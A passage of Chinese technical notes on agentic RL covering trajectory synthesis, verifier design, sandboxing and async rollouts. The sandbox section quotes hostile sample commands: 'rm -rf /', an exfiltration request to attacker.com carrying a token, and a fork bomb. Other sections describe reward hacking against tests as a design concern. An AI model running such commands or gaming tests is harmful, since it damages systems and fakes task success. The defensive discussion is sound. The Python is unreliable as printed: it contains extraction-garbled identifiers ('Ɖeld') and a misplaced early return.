4. 闭环迭代——LoopTool。它解决的是前三种方法的一个共同缺陷：生成的数据是”静态”的——不会根据模型的弱点来调整。
5. 难度自适应——HardGen
6. 后见之明重写——ECHO

无论用哪种方法生成轨迹，都需要质量控制。合成的数据不可避免会有噪声——错误的工具调用参数、逻辑不连贯的推理步骤、甚至”碰巧成功”的轨迹（走了最差的路但结果对了）。质量控制通常包含三个维度：
1. 正确性：工具调用的参数是否正确？调用顺序是否合理？这可以通过自动验证器检查——用静态分析工具检查参数类型，用执行器实际运行验证结果。
  1. 拒绝采样生成的”成功轨迹”一定是好的训练数据吗？拒绝采样保留了所有成功轨迹，但”成功”不等于”好策略”。考虑这样一个场景：模型需要搜索一个事实性问题。模型用了一个非常低效的策略——先搜索了 5 次不相关的关键词，最后碰巧在第 6 次找到了答案。这条轨迹”成功了”，但它的前 5 次搜索完全是无用的。如果用它来训练模型，模型可能会学到”多搜索几次总能找到”的低效策略。
2. 多样性：轨迹是否覆盖了不同的策略？如果 100 条轨迹都是”先搜索再总结”的同一种模式，模型就学不到”先分析再搜索”的替代策略。通常用轨迹嵌入的聚类来衡量——如果轨迹在嵌入空间中形成了多个聚类，说明覆盖了多种策略。
3. 难度分布：数据集中简单/中等/困难样本的比例是否合理？太多简单样本会让模型”安逸”在已知策略上，太多困难样本又可能导致训练不稳定。一个好的分布通常是 30% 简单 + 50% 中等 + 20% 困难。

步骤级校准：除了过滤（生成大量轨迹，用 RLVR 的验证器筛掉不正确的）和排序（对多条轨迹按 RLVR 信号排序，用排名来指导 GRPO 的组内比较），还有一种更精细的做法（诊断）——直接修正轨迹中不理想的步骤。：一条大部分正确但个别步骤有瑕疵的轨迹，与其直接丢弃，不如找到那些不理想的步骤并修正它们。具体做法是通过步骤级奖励对比，识别轨迹中哪些步骤拉低了整体质量，然后用更强模型或规则来校准这些步骤。

一个简易的轨迹合成管线
```py
from dataclasses import dataclass, Ɖeld
from typing import List, Optional
import random
@dataclass
class Trajectory:
  ”””一条完整的交互轨迹”””
  task: str # 用户任务
  turns: List[dict] = Ɖeld(default_factory=list) # 每轮的 (思考, 动作, 观察)
  success: bool = False # 最终是否成功
  num_tool_calls: int = 0 # 工具调用次数
def trajectory_synthesis_pipeline(model, tool_env, tasks, num_samples_per_task=16, quality_threshold=0.6):
  ”””简易轨迹合成管线：拒绝采样 + 质量过滤”””
  all_trajectories = []
  for task in tasks:
    # 阶段 1：批量采样
    candidates = []
    for _ in range(num_samples_per_task):
      traj = model.interact_with_tools(task, tool_env)
      candidates.append(traj)
    # 阶段 2：拒绝采样——只保留成功轨迹
    success_trajs = [t for t in candidates if t.success]
    # 阶段 3：质量过滤
    for traj in success_trajs:
      # 效率检查：超过 8 次工具调用才成功 = 策略低效
      if traj.num_tool_calls > 8:
        continue
      # 多样性检查：与已有轨迹的重复度
      if not is_too_similar(traj, all_trajectories):
        traj.quality_score = compute_quality(traj)
        if traj.quality_score >= quality_threshold:
          all_trajectories.append(traj)
    return all_trajectories
def is_too_similar(new_traj, existing_trajs, threshold=0.85):
  ”””检查新轨迹是否与已有轨迹过于相似（基于动作序列）”””
  new_actions = [t[”action”] for t in new_traj.turns]
  for old_traj in existing_trajs:
    old_actions = [t[”action”] for t in old_traj.turns]
    # 简化：用动作序列的 Jaccard 相似度
    overlap = len(set(new_actions) & set(old_actions))
    union = len(set(new_actions) | set(old_actions))
    if union > 0 and overlap / union > threshold:
      return True
  return False
def compute_quality(traj):
  ”””计算轨迹的综合质量分”””
  # 效率分：工具调用越少越好（鼓励高效策略）
  efficiency = max(0.0, 1.0 - 0.1 * traj.num_tool_calls)
  # 完整性分：每轮都有完整的 (思考, 动作, 观察)
  completeness = sum(
    1 for t in traj.turns
    if t.get(”thought”) and t.get(”action”) and t.get(”observation”)
  ) / max(len(traj.turns), 1)
  return 0.5 * efficiency + 0.5 * completeness
```
经验回放。，工具的执行结果可能随时间变化（搜索引擎的结果会更新），所以旧轨迹可能不再有效。这意味着 Agentic RL 的经验回放需要过期机制——超过一定时间或者环境状态发生变化的旧轨迹应该被丢弃。

### Verifier

Verifier V 是 RL 环境的灵魂。一个坏的 verifier 会让策略学到”奖励最大化但任务失败”的行为（reward hacking）。Verifier 设计有四条原则：
1. 正确性（Correctness），Verifier 必须准确判定”任务是否真的被完成”。理想情况下 V 是确定性函数——给定相同轨迹，永远给出相同结果。验证器 v(x, y) 必须满足：如果答案正确，它几乎一定判对；如果答案错误，它几乎一定判错。这避免引入方差。两种正确性来源：
  1. 形式化正确性：单元测试、类型检查、数学证明、定理证明器（Lean、Coq）——可机械验证
  2. 参考答案匹配：与预先标注的 ground truth 比较——简单但有标注成本
2. 效率（Efficiency）。Verifier 在每轮训练要被调用 B × G 次（B 是 batch size，G 是 group size），动辄数百万次。如果单次验证慢（如跑 100 个测试用例需要 30 秒），整个训练流水线会被 verifier 拖垮。常见优化：
  1. 并行化：每个 sandbox 独立，可用 Ray/Kubernetes 分布式调度
  2. 提前终止：第一个测试失败就返回 0，不跑剩余 99 个
  3. 二值化奖励：避免连续奖励（如部分通过率）增加方差，二值 {0, 1} 更稳定且 GRPO 友好
3. 抗作弊（Anti-gaming）只要 verifier 有可乘之机，策略就会找到。比如单元测试，写空函数让所有 assert False 不执行，可以通过强制覆盖率 ≥ 90%缓解。
4. Verifier 设计要在两类之间权衡：形式化 vs 启发式
  1. 形式化 verifier：单元测试、Lean 证明、SQL 执行——100% 正确，但要求任务有形式化语义
  2. 启发式 verifier：LLM-as-judge、规则匹配、相似度——灵活但有误判风险
  数学、代码任务适合形式化；写作、对话、agent 任务经常不得不依赖启发式（或混合）。形式化是首选，因为 RL 会把启发式的不完美放大成策略缺陷。

### Sandbox 工程

Agent 任务的环境核心是沙箱——一个隔离的执行环境，policy 在其中读写文件、执行代码、调用工具。沙箱工程要解决三个
问题：
1. 隔离性（Isolation）策略输出的代码可能恶意——`os.system(”rm -rf /”)`、`requests.get(”attacker.com/exƉl?token=...”)`、`fork bomb`。沙箱必须保证：
  1. 文件系统隔离：容器 rootfs 独立，无法访问宿主机
  2. 进程隔离：namespace + cgroup，CPU/内存配额
  3. 网络隔离：默认无网络，白名单域名
2. 网络白名单，很多任务需要网络（调用公开 API、下载包）。
3. 多 Agent 并行 Sandbox。RL 训练需要数千个并行 rollout。每个 sandbox 平均 500MB 内存，1000 并发就是 500GB。

一种新的应用负载：过去企业里的负载大致可以分成两类：长期运行的微服务，以及有明确生命周期的离线 Job。这两类负载经过多年发展，已经有了比较成熟的调度和治理体系。Agent 的运行方式明显更随机。它下一步调用什么工具，要跑多少轮，很大程度上由模型动态决定。大量 Agent 还是间歇式执行，任务过程中会等待模型推理，也会等待 Subagent 返回结果。等的时候，资源怎么办？如果 CPU 和内存一直占着，用户就在为等待时间付费；直接把环境销毁，任务状态又没了。原来更适合长时运行实例的调度方式，到这里就显得不那么合适。所以阿里云在 Agent Sandbox 里同时做了快速创建和休眠恢复。Agent Sandbox 每分钟可创建 10 万个沙箱，基于模板创建与冷启动 P99 小于 180 毫秒；资源池预热后，热启动 P99 小于 20 毫秒；深休眠唤醒 P99 低于 600 毫秒。



### 其它

由于真实网页经常变动，导致相同 Query 在不同时间的搜索结果不一致，这严重破坏了强化学习的马尔可夫决策过程（MDP）假设。为此，Alibaba 通义团队开发了 WebShaper，将海量Wikipedia 转化为静态且结构化的离线搜索环境；同时利用 AgentFounder 自动生成具有极高难度（PhD-level）的合成查询和基准答案。这种合成环境的确定性使得模型在多次 Rollout 时的动作与奖励映射关系绝对稳定。

## 工程

为什么 Agentic RL 跑不快？训练循环是纯 GPU 的：模型在 GPU 上生成回答，Reward Model 在 GPU 上打分，梯度在 GPU 上计算。整个过程中最慢的环节通常是 GPU 计算。但 Agentic RL 的训练循环完全不同。模型每生成一个”工具调用”动作，就需要暂停等待工具执行的结果。这个执行过程发生在 GPU 之外：这带来了三个核心瓶颈：
1. 安全性。代码执行必须在沙箱中进行——模型可能生成”删除系统文件”或”读取环境变量”的恶意代码。Docker 容器是最常用的沙箱方案，但容器的创建和销毁有毫秒级的开销，在训练循环中累积起来就成了显著的瓶颈。
2. 可复现性。RL 训练要求相同的输入产生相同的输出。但工具调用的结果可能是不确定的——搜索引擎对同一个 query 在不同时间可能返回不同结果，API 的响应时间可能波动。这导致同一条训练轨迹无法精确复现，增加了调试难度。
3. 延迟。工具调用的响应时间从毫秒（本地代码执行）到秒级（网络 API 调用）不等。在标准 RL 训练中，GPU 的计算是连续的；但在 Agentic RL 中，GPU 经常在”等待”工具执行的结果，导致 GPU 利用率低下。
Agentic RL 的训练基础设施本质上是一个分布式系统——它需要同时管理 GPU 计算、CPU 执行、网络通信、状态同步。这比标准 LLM RL 的”纯 GPU”训练复杂了一个数量级。当工具执行时间远大于 GPU 计算时间时，GPU 大部分时间在空等——这就是为什么**异步并发是 Agentic RL 工程优化的关键**。同时启动多条轨迹的工具调用，让 GPU 在等待一组工具返回的同时处理另一组轨迹。

```
import asyncio
async def rollout_single_trajectory(model, task, sandbox, max_turns=10):
  ”””单条轨迹的异步 rollout”””
  state = task.initial_state()
  turns = []
  for t in range(max_turns):
    # GPU: 模型生成动作
    action = await model.generate_async(state)
    turns.append(action)
    if action.is_final_answer():
      break
    # CPU/网络: 异步执行工具
    observation = await sandbox.execute_async(action)
    state = state.update(observation)
  return turns, task.evaluate(turns)
async def parallel_rollouts(model, tasks, sandbox, num_workers=16):
  ”””并行启动多条轨迹的 rollout，充分利用 GPU 和工具执行器”””
  coroutines = [
    rollout_single_trajectory(model, task, sandbox)
    for task in tasks
  ]
  # asyncio.gather 实现并发：一条轨迹在等工具返回时，其他轨迹可以使用 GPU
  results = await asyncio.gather(*coroutines)
  return results
```
## 小结

如果你要训练一个”能独立完成软件项目”的 Code Agent，你会怎么设计 RL 训练方案？
1. Reward 设计：不能只看”最终代码是否通过测试”。一个好的 Code Agent 还需要：代码可读性（是否写了注释？命名是否清晰？）、架构合理性（是否合理地拆分了模块？）、鲁棒性（是否处理了边界情况？）。这些可以用多维度 reward 来建模。
2. 信用分配：一个软件项目可能需要几十轮交互。纯 ORM 在这里会非常困难——信号太稀疏。PRM 或某种”里程碑式reward”（比如”完成了数据库设计”是一个中间里程碑）可能更合适。
3. 课程学习：不能一开始就让它做完整项目。从单函数 → 单文件 → 多文件 → 完整项目，逐步增加任务难度。
4. 安全约束：代码执行沙箱是必须的，但还需要防止模型学会”走捷径”——比如通过硬编码测试用例来通过测试（而不是真正解决问题）。
